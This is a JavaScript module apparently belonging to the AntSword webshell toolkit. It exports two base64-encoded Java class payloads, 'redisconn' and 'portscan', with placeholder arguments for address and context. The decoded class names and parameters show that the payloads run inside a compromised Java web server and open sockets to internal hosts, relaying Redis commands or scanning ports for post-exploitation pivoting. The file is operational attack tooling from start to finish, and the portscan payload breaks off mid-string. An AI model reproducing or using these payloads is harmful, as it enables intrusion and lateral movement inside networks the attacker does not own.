//
// 其它模板
// 向插件提供
//

module.exports = (arg1, arg2, arg3, arg4, arg5) => ({
    redisconn: {
        _: 'yv66vgAAADIBawoACQCiCQB2AKMJAHYApAgApQoABwCmCACnBwCoCgAHAKkHAKoKAKsArAcArQgArgcArwcAsAoACQCxCAB3CgAHALIKALMAtAoAswC1CAB5CAC2CQB2ALcIALgJAHYAuQgAugkAdgC7BwC8CAC9CgAbAL4IAL8IAMAIAMEIAMIIAMMIAMQLAA0AxQsACwDGCwANAMYLAAsAxwoAdgDICQB2AMkKAHYAygoAGwDLBwDMCgAsAKIIAM0KACwAzgoADgDPCgAsAM8LAA0A0AoAGwDPCgB2ANEKANIA0woA1ADVCgA5ANYKADkA1wcA2AoAdgDZCgA5ANoIANsKANwA3QgA3goAOQDfCADgCADhCgAHAOIIAOMHAOQKADkA5QgA5goABwDnCgDoAOkIAOoIAOsKADkA7AoAdgDtCgAOAO4KAHYA7woAXgDwCgBeAPEHAPIHAPMKAFIA9AoAUQD1CgBRAPYKAFEA9woA+AD5CgA5APoKAF4A+wcA/AoAOQD9CAD+CgA5AP8HAQAKAF4AogoAXgEBCgBeAQIKAF4BAwoAXgEEBwEFCgBkAQYKAF4BBwoAXgEICgAOAQkHAQoIAQsJANQBDAoAqwC0CgAHAQ0KANQBDgoABwEPCgAJAM8IARAIAREKAAcBEggBEwgAjQcBFAEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdlbmNvZGVyAQASTGphdmEvbGFuZy9TdHJpbmc7AQACY3MBAAxyYW5kb21QcmVmaXgBABBkZWNvZGVyQ2xhc3NkYXRhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEADVN0YWNrTWFwVGFibGUHALAHARQHAKoHALAHALwHANgBAAZkZWNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACkV4Y2VwdGlvbnMBAAxCYXNlNjRFbmNvZGUBAAhTZW5kRGF0YQEAOChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7BwEABwEVBwEWBwDyBwD8BwD8BwEXBwEXAQAMY3JlYXRlU29ja2V0AQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uZXQvU29ja2V0OwEACGFzb3V0cHV0AQASQmFzZTY0RGVjb2RlVG9CeXRlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAClNvdXJjZUZpbGUBAA5SZWRpc0Nvbm4uamF2YQwAgACBDAB3AHgMAHkAegEAHWphdmF4LnNlcnZsZXQuanNwLlBhZ2VDb250ZXh0DAEYARkBAApnZXRSZXF1ZXN0AQAPamF2YS9sYW5nL0NsYXNzDAEaARsBABBqYXZhL2xhbmcvT2JqZWN0BwEcDAEdAR4BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQALZ2V0UmVzcG9uc2UBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAR8BIAwBIQEiBwEjDAEkASUMASYBJwEAFGFudHN3b3JkcmFuZG9tUHJlZml4DAB+AHwBAAZiYXNlNjQMAHsAfAEAD2FudHN3b3JkQ2hhcnNldAwAfQB8AQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgEAAAwAgAEoAQADLT58AQADfDwtAQAPYW50c3dvcmRhcmdhZGRyAQASYW50c3dvcmRhcmdjb250ZXh0AQASYW50c3dvcmRhcmdkZWNvZGVyAQAJdGV4dC9odG1sDAEpASgMASoBKAwBKwCODACNAI4MAH8AfAwAkQCSDAEsAS0BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACUVSUk9SOi8vIAwBLAEuDAEvATAMATEBMgwAnQCOBwEzDAE0ASgHATUMATYBNwwBOAE5DACEAIUBABBqYXZhL2xhbmcvU3RyaW5nDACeAJ8MAIABOgEADGphdmEudmVyc2lvbgcBOwwBPACOAQADMS45DAE9ATcBABBqYXZhLnV0aWwuQmFzZTY0AQAKZ2V0RW5jb2RlcgwBPgEbAQAOZW5jb2RlVG9TdHJpbmcBAAJbQgwBPwFAAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwBQQFCBwFDDAFEAUUBAAZlbmNvZGUBAAMNfAoMAUYAkgwAmwCcDAFHATAMAJAAjgwBSAFJDAFKAUsBABZqYXZhL2lvL0J1ZmZlcmVkV3JpdGVyAQAaamF2YS9pby9PdXRwdXRTdHJlYW1Xcml0ZXIMAIABTAwAgAFNDAFOASgMAU8AgQcBFQwBUAFRDACAAVIMAVMAgQEAH2phdmEvbmV0L1NvY2tldFRpbWVvdXRFeGNlcHRpb24MAVQBVQEAAToMAVYBVwEAD2phdmEvbmV0L1NvY2tldAwBWAElDAFZASUMAVoBJQwBWwFcAQAaamF2YS9uZXQvSW5ldFNvY2tldEFkZHJlc3MMAIABXQwBXgFfDAFgAWEMAWIAgQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzDAFjAWQMAWUBZgwBZwFoDAFpAUIBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyDAFEAWoBAApnZXREZWNvZGVyAQAPb3RoZXIvUmVkaXNDb25uAQATamF2YS9pby9JbnB1dFN0cmVhbQEAFGphdmEvaW8vT3V0cHV0U3RyZWFtAQATamF2YS9sYW5nL1Rocm93YWJsZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADnNldENvbnRlbnRUeXBlAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBAAxnZXRQYXJhbWV0ZXIBAAZhcHBlbmQBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAVwcmludAEAEWphdmEvbGFuZy9JbnRlZ2VyAQAIcGFyc2VJbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAAlzdWJzdHJpbmcBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEACWNvbXBhcmVUbwEACWdldE1ldGhvZAEACGdldEJ5dGVzAQAEKClbQgEAFmdldERlY2xhcmVkQ29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgEAC25ld0luc3RhbmNlAQAnKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAKcmVwbGFjZUFsbAEACmdldE1lc3NhZ2UBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAPZ2V0T3V0cHV0U3RyZWFtAQAYKClMamF2YS9pby9PdXRwdXRTdHJlYW07AQAZKExqYXZhL2lvL091dHB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9Xcml0ZXI7KVYBAAV3cml0ZQEABWZsdXNoAQAEcmVhZAEABShbQilJAQAHKFtCSUkpVgEABWNsb3NlAQAGbGVuZ3RoAQADKClJ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',
        [arg1]: '#{newbase64::addr}',
        [arg2]: '#{newbase64::context}'
    },
    portscan: {
        _: 'yv66vgAAADIBLQoACQCLCQBkAIwJAGQAjQgAjgoABwCPCACQBwCRCgAHAJIHAJMKAJQAlQcAlggAlwcAmAcAmQoACQCaCABlCgAHAJsKAJwAnQoAnACeCABnCACfCQBkAKAIAKEJAGQAoggAowkAZACkBwClCACmCgAbAKcIAKgIAKkIAKoIAKsIAKwIAK0LAA0ArgsACwCvCwANAK8LAAsAsAoAZACxCQBkALIKAGQAswoAGwC0BwC1CgAsAIsIALYKACwAtwoADgC4CgAsALgLAA0AuQoAGwC4CgBkALoKALsAvAoAvQC+CgA5AL8KADkAwAcAwQoAZADCCgA5AMMIAMQKADkAxQcAxgoAPgDHCgA+AMgIAMkIAMoKAD4AywgAzAgAzQoAPgCLCgA+AM4KAD4AzwoAPgDQCgA+ANEHANIKAEsAxwoAPgDTCgAOANQHANUIANYHANcJAL0A2AoAlACdCgAHANkKAL0A2goABwDbCgDcAN0KAAkAuAgA3goA3wDgCADhCgA5AOIIAOMIAOQKAAcA5QoABwDmCADnCADoCAB7BwDpAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2VuY29kZXIBABJMamF2YS9sYW5nL1N0cmluZzsBAAJjcwEADHJhbmRvbVByZWZpeAEAEGRlY29kZXJDbGFzc2RhdGEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQANU3RhY2tNYXBUYWJsZQcAmQcA6QcAkwcAmQcApQcAwQEABmRlY29kZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKRXhjZXB0aW9ucwEABFNjYW4BADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwcA6gcAxgcA6wcA6wEADGNyZWF0ZVNvY2tldAEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmV0L1NvY2tldDsBAAhhc291dHB1dAEAEkJhc2U2NERlY29kZVRvQnl0ZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAApTb3VyY2VGaWxlAQANUG9ydFNjYW4uamF2YQwAbgBvDABlAGYMAGcAaAEAHWphdmF4LnNlcnZsZXQuanNwLlBhZ2VDb250ZXh0DADsAO0BAApnZXRSZXF1ZXN0AQAPamF2YS9sYW5nL0NsYXNzDADuAO8BABBqYXZhL2xhbmcvT2JqZWN0BwDwDADxAPIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQALZ2V0UmVzcG9uc2UBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAPMA9AwA9QD2BwD3DAD4APkMAPoA+wEAFGFudHN3b3JkcmFuZG9tUHJlZml4DABsAGoBAAZiYXNlNjQMAGkAagEAD2FudHN3b3JkQ2hhcnNldAwAawBqAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgEAAAwAbgD8AQADLT58AQADfDwtAQANYW50c3dvcmRhcmdpcAEAEGFudHN3b3JkYXJncG9ydHMBABJhbnRzd29yZGFyZ2RlY29kZXIBAAl0ZXh0L2h0bWwMAP0A/AwA/gD8DAD/AHwMAHsAfAwAbQBqDAB+AH8MAQABAQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAJRVJST1I6Ly8gDAEAAQIMAQMBBAwBBQEGDACGAHwHAQcMAQgA/AcBCQwBCgELDAEMAQ0MAHIAcwEAEGphdmEvbGFuZy9TdHJpbmcMAIcAiAwAbgEOAQABLAwBDwEQAQAPamF2YS9uZXQvU29ja2V0DABuAREMARIBEwEAAQkBAAYJT3BlbgoMARQAbwEACAlDbG9zZWQKAQABOgwBFQD5DAEWAPkMARcA+QwBGAEZAQAaamF2YS9uZXQvSW5ldFNvY2tldEFkZHJlc3MMARoBGwwBHABvAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MBAAJbQgwBHQEeDAEfASAMASEBIgwBIwEkBwElDAEmAScBAAxqYXZhLnZlcnNpb24HASgMASkAfAEAAzEuOQwBKgELAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBKwDvDAEmASwBABBqYXZhLnV0aWwuQmFzZTY0AQAKZ2V0RGVjb2RlcgEADm90aGVyL1BvcnRTY2FuAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvbGFuZy9UaHJvd2FibGUBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA5zZXRDb250ZW50VHlwZQEAFHNldENoYXJhY3RlckVuY29kaW5nAQAMZ2V0UGFyYW1ldGVyAQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFcHJpbnQBABFqYXZhL2xhbmcvSW50ZWdlcgEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAFihMamF2YS9sYW5nL1N0cmluZztJKVYBAAxzZXRTb1RpbWVvdXQBAAQoSSlWAQAFY2xvc2UBAA9zZXRSZXVzZUFkZHJlc3MBAAxzZXRLZWVwQWxpdmUBAA1zZXRUY3BOb0RlbGF5AQALc2V0U29MaW5nZXIBAAUoWkkpVgEAB2Nvbm5lY3QBABwoTGphdmEvbmV0L1NvY2tldEFkZHJlc3M7SSlWAQAPcHJpbnRTdGFja1RyYWNlAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAA5nZXRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAljb21wYXJlVG8BAAlnZXRNZXRob2QBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwAhAGQACQAAAAYAAQBlAGYAAAABAGcAaAAAAAEAaQBqAAAAAQBrAGoAAAABAGwAagAAAAEAbQBqAAAABwABAG4AbwABAHAAAAAvAAIAAQAAAA8qtwABKgG1AAIqAbUAA7EAAAABAHEAAAAOAAMAAAAJAAQACgAJAAsAAQByAHMAAQBwAAAC2gAEAAoAAAGaEgS4AAVNKiwSBgO9AAe2AAgrA70ACbYACsAAC7UAAiosEgwDvQAHtgAIKwO9AAm2AArAAA21AAOnAHpNK8EAC5kAciorwAALtQACKrQAArYADxIQtgARTi0EtgASLSq0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